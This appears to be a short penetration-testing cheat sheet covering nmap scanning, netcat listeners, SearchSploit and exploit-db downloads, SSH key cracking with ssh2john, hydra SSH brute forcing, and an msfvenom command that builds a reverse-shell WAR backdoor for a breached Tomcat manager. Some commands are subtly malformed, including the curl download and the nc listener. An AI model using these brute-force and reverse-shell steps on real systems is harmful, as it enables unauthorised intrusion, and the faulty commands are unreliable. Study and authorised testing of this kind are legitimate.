# Starting Penetration

```
msfconsole
```

To Open metasploit console

## Port Scan

```
nmap -sV -sC -O -p- --min-rate 20000 IP
```

Alternate

```
nmap -T4 -A -v IP
```

-O - OS Detection

-p- - to scan all ports

20k rate probably way too high. Reduce to reduce risk of alerting firewall.

-sS - for TCP SYN Scan

-sV - to show services related to each port

-sU - SLOW - only use if no where to go


### Get Version of Service

NetCat

```
nc IP PORT
```

Listen on port
```
nc IP PORT -lvnp
```

Listen throuh metsploit
```
use exploit/multi/handler
```

### Find Exploits with SearchSploit

```
searchsploit servicename version
```

### Add new modules to metasploit from exploit-db

Get path from searchsploit

```
curl http://www.exploit-db.com/download/ID  /root/.msf4/modules/exploits/custom/CUSTOMFILENAME
```



### Metadata

```
exiftool file
```

### Web Server:

```
python3 -m http.server PORT
```

Retrieve:
```
wget http://IP:PORT/PATH
```

## SSH

### SSH with RSA file

```
ssh -i /path/to/file user@IP
```
### Convert id_rsa to crackable

```
python3 /usr/share/john/ssh2john.py id_rsa > file.txt
```

#### Brute Forcing Passwords

```
hydra -l USER -P /path/to/wordlist ssh://IP
```

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials


## Apache

### After /manager breach

#### Make Offensive WAR file

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
```
